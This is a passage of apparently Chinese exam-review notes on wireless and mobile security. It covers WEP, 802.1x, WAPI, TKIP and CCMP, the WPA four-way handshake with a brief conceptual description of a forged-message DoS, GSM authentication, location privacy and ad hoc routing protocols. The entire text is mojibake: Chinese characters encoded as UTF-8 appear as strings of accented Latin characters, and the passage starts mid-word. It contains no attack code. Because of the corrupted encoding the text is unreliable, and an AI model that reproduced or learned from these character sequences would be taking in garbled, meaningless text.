å¯†ç®—æ³•ï¼ŒæµåŠ å¯†ç®—æ³• WEPè®¾è®¡æ€æƒ³ï¼š ä½¿ç”¨RC4åºåˆ—å¯†ç åŠ å¯†ä¿æŠ¤æ•°æ®æœºå¯†æ€§ï¼› Stationä¸APå…±äº«åŒä¸€å¯†é’¥ï¼Œå®æ–½æ¥å…¥æ§åˆ¶ï¼› CRC-32å¾ªç¯å†—ä½™æ ¡éªŒå€¼ä¿è¯æ•°æ®å®Œæ•´æ€§ï¼› åŠ å¯†æ–¹å¼ï¼š $$ RC4ï¼ˆZV,key)\\bigoplus{P,ZCV} $$ è®¡ç®—æ˜æ–‡æ•°æ®çš„CRC-32å†—ä½™æ ¡éªŒç å’Œæ˜æ–‡ä¸€èµ·æ„æˆä¼ è¾“è½½è·ã€‚ Stationå’ŒAPå…±äº«å¯†é’¥Keyã€‚é€‰å®šä¸€ä¸ªåˆå§‹åŒ–çŸ¢é‡IV å°†IVå’ŒKeyè¿æ¥èµ·æ¥æ„æˆç§å­å¯†é’¥ï¼Œé€å…¥RC4ç®—æ³•çš„ä¼ªéšæœºæ•°ç”Ÿæˆå™¨ï¼Œäº§ç”Ÿå¯†é’¥æµ åŠ å¯†å¯†é’¥æµä¸ä¼ è¾“è½½è·å¼‚æˆ–ï¼Œæ„æˆå¯†æ–‡C è§£å¯†æ–¹å¼ï¼š IVæ˜æ–‡å½¢å¼å’ŒCä¸€èµ·å‘é€ æ¥æ”¶æ–¹ä»æ•°æ®åŒ…æå–IVå’ŒCï¼Œå°†IVå’Œkeyä¸€èµ·é€å…¥RC4ä¼ªéšæœºæ•°ç”Ÿæˆå™¨ï¼Œå¾—åˆ°è§£å¯†å¯†é’¥æµ è§£å¯†å¯†é’¥æµå’ŒCå¼‚æˆ–ï¼Œå¾—åˆ°æ˜æ–‡På’ŒCRCæ ¡éªŒå’ŒICV WEPè§„å®šäº†ä¸¤ç§è®¤è¯æ–¹å¼ å¼€æ”¾ç³»ç»Ÿè®¤è¯ ä¸è¿›è¡Œç”¨æˆ·è®¤è¯ï¼Œä»»ä½•æ¥å…¥WLANçš„è¯·æ±‚éƒ½è¢«å…è®¸ å…±äº«å¯†é’¥è®¤è¯ é€šè¿‡æ£€éªŒAPå’ŒStationæ˜¯å¦å…±äº«åŒä¸€å¯†é’¥æ¥å®ç°çš„ï¼ˆWEPåŠ å¯†å¯†é’¥ï¼‰ 802.1xåè®® åŸºäºç«¯å£çš„è®¿é—®æ§åˆ¶åè®® å®šä¹‰äº†ä¸¤ç±»åè®®æ¥å…¥å®ä½“ è®¤è¯è¯·æ±‚è€… è®¤è¯è€… ä½“ç³»ç»“æ„é‡Œåˆ†äº†ä¸‰ä¸ªç»„æˆéƒ¨åˆ† ç”³è¯·è€…ç³»ç»Ÿ è®¤è¯è€…ç³»ç»Ÿ è®¤è¯æœåŠ¡å™¨ è®¤è¯è€…ç³»ç»Ÿå¯¹åº”äºä¸åŒç”¨æˆ·çš„ç«¯å£ï¼Œæœ‰ä¸¤ä¸ªé€»è¾‘ç«¯å£ å—æ§ç«¯å£ï¼šåªåœ¨è®¤è¯é€šè¿‡çš„çŠ¶æ€ä¸‹æ‰æ‰“å¼€ï¼Œç”¨äºä¼ é€’ç½‘ç»œèµ„æºå’ŒæœåŠ¡ éå—æ§ç«¯å£ï¼šå§‹ç»ˆå¤„äºåŒå‘è¿é€šçŠ¶æ€ï¼Œä¸»è¦ç”¨äºä¼ é€ä¸è®¤è¯ç›¸å…³çš„æ•°æ®å¸§ã€‚ 802.1xçš„è®¤è¯æµç¨‹ ç”³è¯·è€…å‘å‡ºè¯·æ±‚è®¤è¯æŠ¥æ–‡EAPOL-start è®¤è¯è€…æ”¶åˆ°æ¶ˆæ¯åå‘ç”³è¯·è€…å‘é€EAP-Request&#x2F;Identityï¼Œè¦æ±‚æä¾›è®¤è¯ä¿¡æ¯ ç”³è¯·è€…å“åº”è¯·æ±‚ï¼Œå‘é€ç”¨æˆ·åä¿¡æ¯ç»™è®¤è¯è€…ã€‚ è®¤è¯è€…å°†æ•°æ®å°åŒ…å¤„ç†å‘ç»™è®¤è¯æœåŠ¡å™¨ã€‚ è®¤è¯æœåŠ¡å™¨æ”¶åˆ°åï¼Œä¸æ•°æ®åº“ä¸­çš„ç”¨æˆ·åè¡¨è¿›è¡Œå¯¹æ¯”ï¼Œæ‰¾åˆ°å¯¹åº”å£ä»¤ä¿¡æ¯å¹¶éšæœºç”ŸæˆåŠ å¯†å­—ï¼Œä¼ ç»™è®¤è¯è€… ç”³è¯·è€…æ”¶åˆ°è®¤è¯è€…ä¼ æ¥çš„åŠ å¯†å­—åï¼Œç”¨å…¶å¯¹å£ä»¤éƒ¨åˆ†åŠ å¯†ï¼Œäº¤ç»™è®¤è¯è€…ã€‚ è®¤è¯è€…å†ä¼ ç»™è®¤è¯æœåŠ¡å™¨ è®¤è¯æœåŠ¡å™¨æ”¶åˆ°åï¼Œä¸è‡ªå·±ç»åŠ å¯†åçš„å£ä»¤è¿›è¡Œå¯¹æ¯”ã€‚æŠŠåé¦ˆä¿¡æ¯ç»™è®¤è¯è€…ã€‚ è®¤è¯è€…å‘å‡ºæ‰“å¼€ç«¯å£çš„æŒ‡ä»¤ï¼Œå‘ŠçŸ¥ä¸šåŠ¡æµå¯é€šè¿‡ç«¯å£è®¿é—®ã€‚å¦åˆ™å¤±è´¥ã€‚ç«¯å£å…³é—­ ç”¨æˆ·è¦æ±‚æ–­å¼€ç½‘ç»œæ—¶ï¼Œå‘é€æ–­ç½‘è¯·æ±‚ã€‚è®¤è¯è€…æŠŠç«¯å£è®¾ç½®ä¸ºéæˆæƒçŠ¶æ€ 802.1xè®¤è¯ç‰¹ç‚¹ åè®®å®ç°ç®€å•ï¼ŒäºŒå±‚åè®®ï¼Œå¯¹è®¾å¤‡æ€§èƒ½è¦æ±‚ä¸é«˜ é‡‡ç”¨å—æ§ç«¯å£å’Œä¸å—æ§ç«¯å£çš„é€»è¾‘åŠŸèƒ½ï¼Œå°†ä¸šåŠ¡ä¸è®¤è¯åˆ†ç¦»ï¼Œç®€åŒ–äº†å¤æ‚è¿‡ç¨‹ï¼Œæé«˜äº†å°è£…æ•ˆç‡ ä¸å¯¹ç§°åè®®ï¼Œåªèƒ½ç½‘ç»œé‰´åˆ«ç”¨æˆ·ï¼Œä¸èƒ½åŒå‘é‰´åˆ«ï¼Œæœ‰å®‰å…¨éšæ‚£ WAPIåè®®ï¼ˆå¤§æ¦‚äº†è§£æ¦‚å¿µï¼‰ åŸºäºå…¬é’¥æŠ€æœ¯å®ç°åŸºç«™å’Œè®¿é—®æ¥å…¥ç‚¹ä¸¤è€…çš„èº«ä»½éªŒè¯ åˆæ³•çš„ç”¨æˆ·æ¥å…¥åˆæ³•çš„ç½‘ç»œ åˆ†ä¸ºæ— çº¿å±€åŸŸç½‘é‰´åˆ«åŸºç¡€ç»“æ„å’Œæ— çº¿å±€åŸŸç½‘ä¿å¯†åŸºç¡€ç»“æ„ WPI ä½¿ç”¨å¯¹ç§°å¯†ç ç®—æ³•å®ç°åŠ &#x2F;è§£å¯† 802.11 i åè®® RSNçš„æ¦‚å¿µ ï¼ˆRobust Security Networkï¼‰å¼ºå¥ç½‘ç»œå®‰å…¨ï¼Œè¿™æ ·åšçš„ç›®çš„æ˜¯ä¸ºäº†æé«˜æ— çº¿ç½‘ç»œçš„å®‰å…¨æ€§ã€‚ TKIP (Temporal Key Integrity Protocol) ä¸´æ—¶ç§˜é’¥å®Œæ•´æ€§åè®® é€šè¿‡ä½¿ç”¨åŠ å¯†æ··åˆå‡½æ•°æ¥å¤„ç†åˆå§‹å‘é‡è¿‡å¼±æˆ–ç©ºé—´è¿‡å°çš„é—®é¢˜ã€‚ TKIPæœ€åŸºæœ¬çš„å†…å®¹å®é™…è¿˜æ˜¯RC4æµåŠ å¯†ç®—æ³•ã€‚ä¸è¿‡ï¼ŒTKIPä¸­å¯†ç ä½¿ç”¨çš„å¯†é’¥é•¿åº¦ä¸º128ä½ã€‚è¿™è§£å†³äº†WEPçš„ç¬¬ä¸€ä¸ªé—®é¢˜ï¼šè¿‡çŸ­çš„å¯†é’¥é•¿åº¦ã€‚ CCMP (CTR with CBC-MAC Protocol) å¯¹ç§°å¯†é’¥å—å¯†ç æ¨¡å¼ã€‚ CCMPæ˜¯åœ¨AESçš„CCMæ¨¡å¼åŸºç¡€ä¸Šæ”¹è¿›è€Œæ¥çš„å¯†ç åè®®ã€‚ CCMPåŠ å¯†åœ¨802.11iä¿®æ­£æ¡ˆä¸­å®šä¹‰ï¼Œç”¨äºå–ä»£TKIPå’ŒWEPåŠ å¯†ã€‚ CCMPä½¿ç”¨AESå—åŠ å¯†ç®—æ³•å–ä»£WEPå’ŒTKIPçš„RC4æµåŠ å¯†ç®—æ³•ï¼Œå®ƒä¹Ÿæ˜¯WAP2æŒ‡å®šçš„åŠ å¯†æ–¹å¼ å› ä¸ºAESåŠ å¯†ç®—æ³•æ˜¯å’Œå¤„ç†å™¨ç›¸è”ç³»çš„ï¼Œæ‰€ä»¥æ—§çš„è®¾å¤‡ä¸­å¯ä»¥æ”¯æŒWEPå’ŒTKIPï¼Œä½†æ˜¯ä¸èƒ½æ”¯æŒCCMP&#x2F;AESåŠ å¯† TKIPå’ŒCCMPåŒºåˆ« TKIPåŸºäºRC4ã€‚CCMPåŸºäºAESç®—æ³•ï¼Œéœ€è¦ç¡¬ä»¶æ”¯æŒ TKIPå’ŒWEPå…³ç³» TKIPç”¨ä»¥åœ¨ä¸éœ€è¦å‡çº§ç¡¬ä»¶çš„åŸºç¡€ä¸Šæ›¿ä»£WEPåè®®ã€‚ ç”±äºWEPåè®®çš„è–„å¼±é€ æˆäº†æ•°æ®é“¾è·¯å±‚å®‰å…¨è¢«å®Œå…¨è·³è¿‡ï¼Œä¸”ç”±äºå·²ç»åº”ç”¨çš„å¤§é‡æŒ‰ç…§WEPè¦æ±‚åˆ¶é€ çš„ç½‘ç»œç¡¬ä»¶æ€¥éœ€æ›´æ–°æ›´å¯é çš„å®‰å…¨åè®®ï¼Œåœ¨æ­¤èƒŒæ™¯ä¸‹ä¸´æ—¶å¯†é’¥å®Œæ•´æ€§åè®®åº”è¿è€Œç”Ÿã€‚ åªè¦ç¡¬ä»¶æ”¯æŒWEPåŠ å¯†ï¼Œé€šè¿‡åœ¨ç°æœ‰çš„è®¾å¤‡ä¸Šå‡çº§å›ºä»¶å’Œé©±åŠ¨ç¨‹åºå°±èƒ½å¤Ÿæ”¯æŒæ›´å®‰å…¨çš„TKIPåŠ å¯†ã€‚ TKIPæ˜¯ä¸ºäº†å‡çº§WEPåŠ å¯†çš„å®‰å…¨æ€§ï¼ŒTKIPä¿ç•™äº†WEPçš„åŸºæœ¬æ¶æ„ä¸è¿‡ç¨‹æ–¹å¼ï¼Œä¸è¿‡æ˜¯åœ¨WEPæœ€æ˜“é­å—æ”»å‡»çš„å¼±ç‚¹è¿›è¡Œäº†åŠ å¼ºã€‚ 1ï¼‰ TKIPä½¿ç”¨äº†ä¸€ç§æ–°å‹çš„å®Œæ•´æ€§æ ¡éªŒMICç®—æ³•ï¼Œå®Œæ•´æ€§æ ¡éªŒæ•£åˆ—ç®—æ³•å–ä»£WEPçš„CRCï¼Œå¹¶ä¸”SAå’ŒDAéƒ½ä¼šå—åˆ°MICçš„ä¿æŠ¤ï¼Œæ£€æµ‹ä¼ªé€ å¸§ä¹Ÿç›¸å¯¹å®¹æ˜“ã€‚è€ŒWEPä¸ä¿æŠ¤å¸§å¤´ï¼ŒMICè¿˜çº³å…¥äº†ä¼˜å…ˆçº§ä½ä¿¡æ¯ã€‚ 2ï¼‰ TKIPå¯¹å¸§è¿›è¡Œè®¡æ•°ï¼Œæ¬¡åºé”™ä¹±çš„å¸§å°†è¢«ä¸¢å¼ƒï¼› 3ï¼‰ TKIPä½¿ç”¨ä¸€ç§å¯†é’¥æ··åˆå‡½æ•°å¤„ç†ç”Ÿæˆå¯†é’¥ï¼ŒWEPåŠ å¯†çš„IVæ˜¯24ä½ï¼ŒTKIPå°†IVå¢åŠ åˆ°48ä½ï¼Œä»è€Œä¿è¯äº†IVçš„ä¸å¯é‡å¤æ€§ï¼Œè¿™æ ·ç”¨æ¥åŠ å¯†çš„Keyä¹Ÿé¿å…äº†é‡å¤ï¼Œæ¯ä¸ªå¸§çš„åŠ å¯†ç§˜é’¥éƒ½æ˜¯ä¸åŒçš„ã€‚ TKIPã€WEPã€CCMPåŒºåˆ«å…³ç³» CCMPä½¿ç”¨AESå—åŠ å¯†ç®—æ³•å–ä»£WEPå’ŒTKIPçš„æµç§˜é’¥åŠ å¯†ç®—æ³•ï¼ŒAESä½¿ç”¨çš„æ˜¯å¯¹ç§°åŠ å¯†ç®—æ³•ï¼Œ TKIPåŸºäºRC4ï¼Œä»–åšä¸€ä¸ªè¿‡åº¦ï¼ŒCCMPåŸºäºAESç®—æ³•ï¼Œéœ€è¦ç¡¬ä»¶æ”¯æŒã€‚TKIPå¯¹å·²ç»åœ¨ç”¨çš„è·¯ç”±å™¨ï¼Œæ¥åšä¸€ä¸ªè¿‡åº¦ï¼Œæ˜¯è®¾å¤‡èƒ½é€‚é…æ›´é«˜çº§åˆ«çš„å®‰å…¨ç­‰çº§ï¼Œ å››æ¬¡æ¡æ‰‹åè®®ï¼ˆå¾ˆé‡è¦ï¼‰ Wireshark ç”¨eapolè¿‡æ»¤çœ‹æ¡æ‰‹åŒ… $$ AP\\to STA $$ A_nonce ã€PTK $$ STA\\to AP $$ S_nonce MIC $$ AP\\to STA$$ MIC $$ STA\\to AP $$ â€‹ MIC AP $ \\to$ Station , APå‘é€éšæœºæ•°Anonceç»™STAã€‚å½“STAæ”¶åˆ°Anonceæ—¶ï¼Œå’Œè‡ªå·±äº§ç”Ÿçš„Snonceè®¡ç®—ç”ŸæˆPTKã€‚ Station $\\to$ APï¼ŒSTAå‘é€éšæœºæ•°Snonceç»™APã€‚æ­¤æ¶ˆæ¯æºå¸¦äº†æ¶ˆæ¯å®Œæ•´ç MICï¼Œå®ƒæ˜¯ç”±STAç”¨åˆšåˆšå¾—åˆ°çš„PTKä¸­çš„å¯†é’¥å®Œæ•´æ€§å¯†é’¥è®¡ç®—è€Œæ¥ã€‚ç„¶åï¼ŒAPè®¡ç®—å‡ºPTKå¹¶åˆ©ç”¨å¯†é’¥å®Œæ•´æ€§å¯†é’¥éªŒè¯MICã€‚ AP $\\to$ Station ï¼Œ APå‘é€ä¸€ä¸ªåŒ…å«MICçš„æ¶ˆæ¯ç»™STAã€‚ STA $ \\to $ AP ï¼ŒSTAæ‰¿è®¤æ¥æ”¶åˆ°ç¬¬ä¸‰ä¸ªæ¶ˆæ¯ã€‚éªŒè¯MICï¼Œé€šè¿‡éªŒè¯è£…è½½PTK æ ¹æ®å››æ¬¡æ¡æ‰‹ï¼Œåˆ¤æ–­æ¡æ‰‹åŒ…æ˜¯ä¸æ˜¯æœ‰æ•ˆçš„ï¼Œè¦é›†é½message1234æ‰æ˜¯æœ‰æ•ˆçš„ã€‚ å› ä¸ºç ´è§£éœ€è¦ä¸‰ä¸ªå‚æ•°ï¼ŒAPç”Ÿæˆçš„éšæœºæ•°ï¼ŒStationç”Ÿæˆçš„éšæœºæ•°ï¼ŒMICåšæ¯”è¾ƒ ã€‚ æ”»å‡»è€…å¯ä»¥åœ¨å››æ¬¡æ¡æ‰‹è¿‡ç¨‹ä¸­Message2å‘é€å,å†’å……APå‘STAå‘é€ä¼ªé€ çš„Messagelâ€™ã€‚STAå°†æ ¹æ®æ–°çš„Messagelâ€™ä¸­çš„Anonceâ€™å’Œæœ¬èº«äº§ç”Ÿçš„æ–°çš„Snonceã€‚é‡æ–°è®¡ç®—PTKâ€™ï¼Œè€ŒPTKâ€™ä¸è®¤è¯è€…æ”¶åˆ°Message2åäº§ç”Ÿçš„PTKæ˜¾ç„¶æ˜¯ä¸ä¸€è‡´çš„ï¼Œè¿™æ ·STAæ”¶åˆ°Message3åæ— æ³•æ­£ç¡®æ ¡éªŒï¼Œå°±ä¼šå¯¼è‡´å››æ¬¡æ¡æ‰‹è¿‡ç¨‹è¢«ç»ˆæ­¢ï¼Œé€ æˆäº†DoSæ”»å‡»ã€‚ 802.11r åšå¿«é€Ÿåˆ‡æ¢çš„æ—¶å€™ç”¨çš„åè®® 802.11sæ˜¯ä»€ä¹ˆåè®® åŸºäº802.11çš„æ— çº¿Meshç½‘ç»œã€‚å®šä¹‰äº†ä¸‰ä¸ªç»“ç‚¹ï¼ŒMesh èŠ‚ç‚¹ï¼ˆMPï¼‰æ˜¯æ”¯æŒæ— çº¿å±€åŸŸç½‘mesh æœåŠ¡çš„802.11 å®ä½“ï¼›Mesh æ¥å…¥èŠ‚ç‚¹ï¼ˆMAPï¼‰æ˜¯ä½œä¸ºæ¥å…¥ç‚¹çš„MPï¼Œæ‹¥æœ‰MPçš„å…¨éƒ¨åŠŸèƒ½ï¼Œå¹¶æä¾›æ¥å…¥æœåŠ¡ã€‚Mesh é—¨æ¡¥èŠ‚ç‚¹ï¼ˆMPPï¼‰æ˜¯MAC åè®®æ•°æ®å•å…ƒï¼ˆMSDUï¼‰è¿›å…¥æˆ–ç¦»å¼€æ— çº¿meshç½‘ç»œçš„æ¡¥æ¥ï¼ˆbridgeï¼‰ã€‚å…¶ä¸­ï¼ŒMP æ²¡æœ‰AP çš„åŠŸèƒ½ï¼Œåªèƒ½ä½œä¸ºä¸­ç»§èŠ‚ç‚¹ã€‚ ç¬¬ä¸‰ç« HLRã€VLRå¯„å­˜å™¨ä¹‹é—´çš„åŒºåˆ« HLRå½’å±ä½ç½®å¯„å­˜å™¨ï¼šç”¨äºç§»åŠ¨ç”¨æˆ·ç®¡ç†çš„é™æ€æ•°æ®åº“ VLRï¼šæ‹œè®¿ä½ç½®å¯„å­˜å™¨ï¼ŒåŠ¨æ€æ•°æ®åº“ IMSIã€TMSIã€MRSNã€MSISDNéƒ½æ˜¯ä»€ä¹ˆ IMSIï¼šå›½é™…ç§»åŠ¨ç”¨æˆ·è¯†åˆ«ç ã€‚GSMç³»ç»Ÿä¸­æ¯ä¸ªç”¨æˆ·åˆ†é…å”¯ä¸€ä¸€ä¸ªï¼Œé©»ç•™åœ¨SIMå¡ MSISDNï¼šç§»åŠ¨ç”¨æˆ·ISDNç ï¼Œæ˜¯ç”¨æˆ·ä¸ºæ‰¾åˆ°GSMç”¨æˆ·æ‰€æ‹¨çš„å·ç ã€‚ç”¨äºPSTNæˆ–ISDNæˆ–å…¶ä»–ç§»åŠ¨ç”¨æˆ·æ‹¨å‘GSMç³»ç»Ÿçš„å·ç ã€‚MSISDN&#x3D;CC+NDC+SNCC&#x3D;å›½å®¶ç ï¼ˆå¦‚ä¸­å›½86ï¼‰ï¼ŒNDC&#x3D;å›½å†…åœ°åŒºç ï¼ŒSN&#x3D;ç”¨æˆ·å·ç  MSRNï¼šç§»åŠ¨ç”¨æˆ·æ¼«æ¸¸å·ç  MSISDNå’ŒMSRNåŒºåˆ« MSISDNåªåœ¨ç½‘ç»œä¸­å…³è”ï¼Œåªåœ¨è¢«å‘¼æ—¶æœ‰æ•ˆã€‚å®ƒåªä¸ç”¨æˆ·å‘ç”Ÿä½œç”¨ï¼Œæ˜¯ä¸€ä¸ªç›®å½•å·ç  MSRNçš„ä½¿ç”¨æ˜¯éå¸¸ä¸¥æ ¼çš„ï¼Œå®ƒåªç”¨åœ¨ç½‘ç»œå®ä½“ä¹‹é—´ï¼Œæ²¡æœ‰ç”¨æˆ·å¯ä»¥è®¿é—®å®ƒ TMSIï¼šä¸´æ—¶è¯†åˆ«ç¬¦ GSMé‰´æƒï¼Œä¸‰å‚æ•°ç»„éƒ½æ˜¯ä»€ä¹ˆ éšæœºæ•°RANDã€ç¬¦å·å“åº”XRESã€åŠ å¯†å¯†é’¥Kc åŠ å¯†å¯†é’¥æ”¾åœ¨å“ªé‡Œï¼Œï¼ˆç”¨æˆ·é‰´æƒé”®Kiï¼‰ åŠ å¯†å¯†é’¥Kcä¸åœ¨æ— çº¿æ¥å£ä¸Šä¼ é€ï¼Œè€Œæ˜¯åœ¨SIMå¡å’ŒAUCä¸­ï¼Œç”±è¿™ä¸¤éƒ¨åˆ†æ¥å®Œæˆç›¸åº”çš„ç®—æ³•ã€‚ åŠ å¯†ã€é‰´æƒã€å¯†é’¥ç”Ÿæˆçš„ç®—æ³•éƒ½æ˜¯ä»€ä¹ˆ åŠ å¯†ï¼šé€šè¿‡ç›¸åŒçš„è¾“å…¥å‚æ•°RANDå’ŒKiï¼Œå°†ä¸¤ä¸ªç®—æ³•åˆä¸ºä¸€ä¸ªæ¥è®¡ç®—ç¬¦å·å“åº”å’ŒåŠ å¯†å¯†é’¥ã€‚å°†A8ç®—æ³•ç”Ÿæˆçš„åŠ å¯†å¯†é’¥Kcå’Œæ‰¿è½½ç”¨æˆ·æ•°æ®æµçš„TDMAæ•°æ®å¸§çš„å¸§å·ä½œä¸ºA5ç®—æ³•çš„è¾“å…¥å‚æ•°ï¼Œç”Ÿæˆä¼ªéšæœºæ•°æ®æµã€‚å†å°†ä¼ªéšæœºæ•°æ®æµå’ŒæœªåŠ å¯†çš„æ•°æ®æµä½œæ¨¡2åŠ è¿ç®—ï¼Œå¾—åˆ°åŠ å¯†æ•°æ®æµã€‚ GSMé—®é¢˜æ˜¯ä»€ä¹ˆ TMSIçš„å®‰å…¨æ–°é—®é¢˜ï¼Œæ•°æ®ä¸¢å¤±ï¼Œè¦æ˜æ–‡å‘é€IMSI è®¤è¯æ–¹æ¡ˆç¼ºé™·ï¼Œç”¨æˆ·é‰´æƒæ˜¯å•å‘çš„ åŠ å¯†æ–¹æ¡ˆç¼ºé™· åŠ å¯†ç®—æ³•ä¸å…¬å¼€ã€‚ç®—æ³•å›ºå®šä¸å˜ ä¸æ˜¯ç«¯åˆ°ç«¯ï¼Œå•å‘è®¤è¯ï¼ˆç”¨æˆ·ä¸èƒ½é‰´åˆ«ç½‘ç»œï¼‰ ä¸ºäº†ä¿è¯GSMçš„å®‰å…¨æ€§èƒ½ï¼Œé‡‡å–äº†ä»€ä¹ˆå®‰å…¨æªæ–½ æ¥å…¥ç½‘é‡‡ç”¨ç”¨æˆ·é‰´æƒæ— çº¿é“¾è·¯ä¸Šé‡‡ç”¨é€šä¿¡ä¿¡æ¯åŠ å¯†ç”¨æˆ·èº«ä»½ï¼ˆIMSIï¼‰é‡‡ç”¨ä¸´æ—¶è¯†åˆ«ç ï¼ˆTMSIï¼‰ä¿æŠ¤ç§»åŠ¨è®¾å¤‡é‡‡ç”¨è®¾å¤‡è¯†åˆ«SIMå¡ç”¨PINç ä¿æŠ¤ç­‰ GPRSå’ŒGSMåŒºåˆ« GSMç”µè·¯äº¤æ¢ã€GPRSåˆ†ç»„æ— é™æœåŠ¡æŠ€æœ¯åŸºäºTCP&#x2F;IPï¼ˆ2.5Gï¼‰ UMTS åŒå‘å¥å…¨ã€ AKAåè®® ï¼ˆå¯†é’¥äº§ç”Ÿçš„æ—¶å€™ã€‚è®¤è¯ä¸å¯†é’¥åè®®&#x2F;å¥å…¨ä¸å¯†é’¥åè®®ï¼‰ ç¬¬å››ç« ä½ç½®éšç§ï¼Œå¤§æ¦‚äº†è§£ LBSè‹±æ–‡å…¨ç§°ä¸ºLocation Based Services, å®ƒåŒ…æ‹¬ä¸¤å±‚å«ä¹‰ï¼šé¦–å…ˆæ˜¯ç¡®å®šç§»åŠ¨è®¾å¤‡æˆ–ç”¨æˆ·æ‰€åœ¨çš„åœ°ç†ä½ç½®ï¼›å…¶æ¬¡æ˜¯æä¾›ä¸ä½ç½®ç›¸å…³çš„å„ç±»ä¿¡æ¯æœåŠ¡ã€‚æ‰€ä»¥è¯´LBSå°±æ˜¯è¦å€ŸåŠ©äº’è”ç½‘æˆ–æ— çº¿ç½‘ç»œï¼Œåœ¨å›ºå®šç”¨æˆ·æˆ–ç§»åŠ¨ç”¨æˆ·ä¹‹é—´ï¼Œå®Œæˆå®šä½å’ŒæœåŠ¡ä¸¤å¤§åŠŸèƒ½ã€‚ ä½ç½®åŒ¿å ä½ç½®åŒ¿åçš„å³æ—¶æ€§ç‰¹ç‚¹ã€‚åœ¨ä½ç½®éšç§ä¸­ï¼Œé€šå¸¸å¤„ç†å™¨é¢ä¸´ç€å¤§é‡ç§»åŠ¨å¯¹è±¡è¿ç»­çš„æœåŠ¡è¯·æ±‚ä»¥åŠè¿ç»­æ”¹å˜çš„ä½ç½®ä¿¡æ¯ï¼Œä½¿å¾—åŒ¿åå¤„ç†çš„æ•°æ®é‡å·¨å¤§è€Œä¸”é¢‘ç¹çš„å˜åŒ–ã€‚åœ¨è¿™ç§åœ¨çº¿ï¼ˆOnlineï¼‰çš„ç¯å¢ƒä¸‹ï¼Œå“åº”æ—¶é—´ä¹Ÿæ˜¯ç”¨æˆ·çš„æ»¡æ„åº¦çš„ä¸€ä¸ªé‡è¦è¡¡é‡æ ‡å‡†ã€‚ ä½ç½®éšç§ä¿æŠ¤ä¸»è¦çš„å·¥ä½œï¼šç¬¬ä¸€ï¼Œä½ç½®åŒ¿åï¼ˆLocation Anonymizationï¼‰ã€‚åŒ¿åæŒ‡çš„æ˜¯ä¸€ç§çŠ¶æ€ï¼Œè¿™ç§çŠ¶æ€ä¸‹å¾ˆå¤šå¯¹è±¡ç»„æˆä¸€ä¸ªé›†åˆï¼Œä»é›†åˆå¤–å‘é›†åˆé‡Œçœ‹ï¼Œç»„æˆé›†åˆçš„å„ä¸ªå¯¹è±¡æ— æ³•åŒºåˆ«ï¼Œè¿™ä¸ªé›†åˆç§°ä¸ºåŒ¿åé›†ã€‚ç¬¬äºŒï¼ŒæŸ¥è¯¢å¤„ç†ã€‚æ„ŸçŸ¥ä½ç½®éšç§çš„ LBSç³»ç»Ÿä¸­ï¼Œä½ç½®ä¿¡æ¯ç»è¿‡åŒ¿åå¤„ç†ä¸å†æ˜¯ç”¨æˆ·çš„çœŸå®ä½ç½®ï¼Œå¯èƒ½æ˜¯å¤šä¸ªä½ç½®çš„é›†åˆä¹Ÿå¯èƒ½æ˜¯ä¸€ä¸ªæ¨¡ç³ŠåŒ–ï¼ˆObfuscationï¼‰çš„ä½ç½®ã€‚ã€‚ ä½ç½®åŒ¿åæŸ¥è¯¢å¤„ç† ï¼ˆ4ï¼‰åŸºäºä½ç½®åŒ¿åçš„æŸ¥è¯¢å¤„ç†ã€‚ç»è¿‡åŒ¿åå¤„ç†çš„ä½ç½®ä¿¡æ¯ï¼Œé€šå¸¸æ˜¯å¯¹ç²¾ç¡®çš„ä½ç½®ç‚¹è¿›è¡Œæ¨¡ç³ŠåŒ–å¤„ç†åçš„ä½ç½®åŒºåŸŸã€‚å¾—åˆ°çš„æŸ¥è¯¢ç»“æœè·Ÿç²¾ç¡®çš„ä½ç½®ç‚¹çš„æŸ¥è¯¢ç»“æœæ˜¯ä¸ä¸€æ ·çš„ã€‚å¦‚ä½•æ‰¾åˆ°åˆé€‚çš„æŸ¥è¯¢ç»“æœé›†ï¼Œä½¿å¾—çœŸå®çš„æŸ¥è¯¢ç»“æœè¢«åŒ…å«åœ¨é‡Œé¢ï¼ŒåŒæ—¶ä¹Ÿæ²¡æœ‰æµªè´¹é€šè®¯ä»£ä»·å’Œè®¡ç®—ä»£ä»·ï¼Œæ˜¯åŒ¿åæˆåŠŸä¹‹åéœ€è¦å¤„ç†çš„ä¸»è¦é—®é¢˜ã€‚ ç¬¬å…­ç« ç§»åŠ¨Ad hocç½‘ç»œçš„ç‰¹ç‚¹ æ— åŸºç¡€è®¾æ–½ã€‚ä½¿ç”¨æ— çº¿é“¾è·¯ã€‚å¤šè·³ã€‚èŠ‚ç‚¹è‡ªç”±ç§»åŠ¨ã€‚æ— å®šå½¢ã€‚èƒ½é‡é™åˆ¶ã€‚å†…å­˜å’Œè®¡ç®—åŠŸç‡é™åˆ¶ã€‚ è·¯ç”±å®‰å…¨ DSDVã€AODVã€DSRä¸‰ç§åè®®äº†è§£ï¼Œæœ‰ä»€ä¹ˆåŒºåˆ«ï¼Œå±äºä»€ä¹ˆåˆ†ç±»ã€‚å“ªäº›æ”¯æŒå•å‘é“¾è·¯ï¼Œå“ªäº›ä¸æ”¯æŒå•å‘é“¾è·¯ã€‚ DSDV è¡¨é©±åŠ¨çš„åè®®ã€‚é‡‡ç”¨äº†åºåˆ—å·æœºåˆ¶æ¥åŒºåˆ†è·¯ç”±çš„æ–°æ—§ç¨‹åº¦ï¼Œé˜²æ­¢å¯èƒ½å‘ç”Ÿçš„è·¯ç”±ç¯è·¯ã€‚ åŸºäºåŒå‘é“¾è·¯ï¼Œä¸æ”¯æŒå•å‘é“¾è·¯ã€‚ DSR åŠ¨æ€æºè·¯ç”±åè®®ã€‚ èŠ‚ç‚¹éœ€è¦å‘é€æ•°æ®åˆ†ç»„æ—¶æ‰è¿›è¡Œè·¯ç”±å‘ç°è¿‡ç¨‹ æ”¯æŒå•å‘é“¾è·¯ ADOV æ— çº¿è‡ªç»„ç½‘æŒ‰éœ€å¹³é¢è·ç¦»å‘é‡è·¯ç”±åè®® é€šå¾€ç›®çš„èŠ‚ç‚¹è·¯å¾„ä¸Šçš„å„èŠ‚ç‚¹å‡å»ºç«‹å’Œç»´æŠ¤è·¯ç”±è¡¨ï¼Œè·¯ç”±æŠ¥æ–‡å¤´éƒ¨ä¸å†éœ€è¦æºå¸¦å®Œæ•´è·¯å¾„ï¼Œå‡å°‘äº†æŠ¥æ–‡å¤´éƒ¨è·¯ç”±ä¿¡æ¯å¯¹ä¿¡é“çš„å ç”¨ï¼Œæé«˜äº†ç³»ç»Ÿæ•ˆç‡ã€‚ 